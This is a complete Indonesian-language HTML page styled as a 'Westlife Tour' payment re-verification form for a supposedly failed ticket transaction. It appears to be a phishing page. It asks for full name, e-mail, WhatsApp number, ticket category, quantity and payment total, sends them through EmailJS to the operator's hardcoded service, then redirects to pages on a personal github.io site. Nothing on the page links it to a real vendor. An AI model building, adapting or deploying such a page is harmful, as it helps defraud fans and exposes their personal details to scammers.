<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>WESTLIFE PAYMENT VERIFICATION</title>

<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">

<style>
*{
margin:0;
padding:0;
box-sizing:border-box;
font-family:'Poppins',sans-serif;
}

body{
background:#050505;
overflow-x:hidden;
min-height:100vh;
display:flex;
justify-content:center;
align-items:center;
padding:20px;
position:relative;
}

/* Animated Background */

.bg{
position:fixed;
width:100%;
height:100%;
top:0;
left:0;
overflow:hidden;
z-index:-1;
}

.circle{
position:absolute;
border-radius:50%;
background:rgba(212,175,55,0.15);
animation:float 12s infinite linear;
filter:blur(20px);
}

.circle:nth-child(1){
width:250px;
height:250px;
top:10%;
left:5%;
animation-duration:15s;
}

.circle:nth-child(2){
width:300px;
height:300px;
bottom:5%;
right:10%;
animation-duration:18s;
}

.circle:nth-child(3){
width:180px;
height:180px;
top:45%;
left:45%;
animation-duration:12s;
}

@keyframes float{
0%{
transform:translateY(0px) rotate(0deg);
}
50%{
transform:translateY(-50px) rotate(180deg);
}
100%{
transform:translateY(0px) rotate(360deg);
}
}

/* Card */

.container{
width:100%;
max-width:520px;
background:rgba(15,15,15,0.95);
backdrop-filter:blur(15px);
border:1px solid rgba(212,175,55,0.25);
border-radius:28px;
overflow:hidden;
box-shadow:
0 0 40px rgba(212,175,55,0.15),
0 0 120px rgba(212,175,55,0.05);
animation:fadeIn 1s ease;
}

@keyframes fadeIn{
from{
opacity:0;
transform:translateY(40px);
}
to{
opacity:1;
transform:translateY(0);
}
}

.banner{
width:100%;
height:220px;
object-fit:cover;
display:block;
}

.content{
padding:30px;
}

.title{
font-size:28px;
font-weight:700;
text-align:center;
color:#d4af37;
margin-bottom:10px;
}

.subtitle{
text-align:center;
font-size:14px;
color:#bdbdbd;
margin-bottom:30px;
line-height:24px;
}

/* Input */

.group{
margin-bottom:18px;
}

label{
display:block;
margin-bottom:8px;
color:#d4af37;
font-size:14px;
font-weight:500;
}

input,select{
width:100%;
padding:16px;
border:none;
outline:none;
border-radius:14px;
background:#151515;
color:#ffffff;
font-size:15px;
border:1px solid #2c2c2c;
transition:0.3s;
}

input:focus,select:focus{
border:1px solid #d4af37;
box-shadow:0 0 20px rgba(212,175,55,0.25);
}

/* Button */

button{
width:100%;
padding:18px;
border:none;
border-radius:16px;
background:linear-gradient(135deg,#d4af37,#ffdf6b);
color:#000;
font-size:17px;
font-weight:700;
cursor:pointer;
transition:0.4s;
margin-top:10px;
position:relative;
overflow:hidden;
}

button:hover{
transform:translateY(-3px);
box-shadow:0 10px 30px rgba(212,175,55,0.35);
}

button:active{
transform:scale(0.98);
}

/* Loading */

.loading{
display:none;
margin-top:25px;
text-align:center;
}

.loader{
width:60px;
height:60px;
border:5px solid rgba(255,255,255,0.1);
border-top:5px solid #d4af37;
border-radius:50%;
margin:auto;
animation:spin 1s linear infinite;
}

@keyframes spin{
100%{
transform:rotate(360deg);
}
}

.loading p{
margin-top:18px;
color:#ffffff;
font-size:15px;
line-height:26px;
}

/* Footer */

.footer{
margin-top:25px;
text-align:center;
font-size:12px;
color:#777;
line-height:22px;
}
</style>
</head>

<body>

<div class="bg">
<div class="circle"></div>
<div class="circle"></div>
<div class="circle"></div>
</div>

<div class="container">

<img class="banner"
src="https://i.imgur.com/4M7IWwP.jpeg">

<div class="content">

<div class="title">
WESTLIFE TOUR
</div>

<div class="subtitle">
Verifikasi pembayaran ulang untuk transaksi sebelumnya yang gagal diproses.
</div>

<div class="group">
<label>Nama Lengkap</label>
<input type="text" id="name" placeholder="Masukkan nama lengkap">
</div>

<div class="group">
<label>E-mail</label>
<input type="email" id="email" placeholder="Masukkan e-mail">
</div>

<div class="group">
<label>WhatsApp</label>
<input type="text" id="whatsapp" placeholder="08xxxxxxxxxx">
</div>

<div class="group">
<label>Kategori Tiket</label>
<select id="category">
<option value="VIP FESTIVAL">VIP FESTIVAL</option>
<option value="GOLD">GOLD</option>
<option value="SILVER">SILVER</option>
<option value="BRONZE">BRONZE</option>
</select>
</div>

<div class="group">
<label>Jumlah Tiket</label>
<input type="number" id="qty" placeholder="Jumlah tiket">
</div>

<div class="group">
<label>Total Pembayaran</label>
<input type="text" id="total" placeholder="Rp 0">
</div>

<button onclick="kirimEmail()">
VERIFIKASI PEMBAYARAN
</button>

<div class="loading" id="loading">
<div class="loader"></div>

<p>
Sedang memverifikasi pembayaran ulang...<br>
Mohon tunggu beberapa saat
</p>
</div>

<div class="footer">
WESTLIFE THE ANNIVERSARY WORLD TOUR<br>
25 YEARS OF HITS
</div>

</div>
</div>

<!-- EMAILJS -->
<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>

<script>
emailjs.init("4xVw4LRaVL7_wqucZ");

function kirimEmail(){

document.getElementById("loading").style.display="block";

const params = {

user_name:
document.getElementById("name").value,

user_email:
document.getElementById("email").value,

user_whatsapp:
document.getElementById("whatsapp").value,

ticket_category:
document.getElementById("category").value,

ticket_qty:
document.getElementById("qty").value,

payment_total:
document.getElementById("total").value

};

emailjs.send(
"service_u62dcyu",
"template_rgb55jj",
params
)

.then(function(response){

setTimeout(function(){

window.location.href =
"https://fforeverindonesia-svg.github.io/success.html/";

},3000);

})

.catch(function(error){

setTimeout(function(){

window.location.href =
"https://fforeverindonesia-svg.github.io/failed.html/";

},3000);

});

}
</script>

</body>
</html>
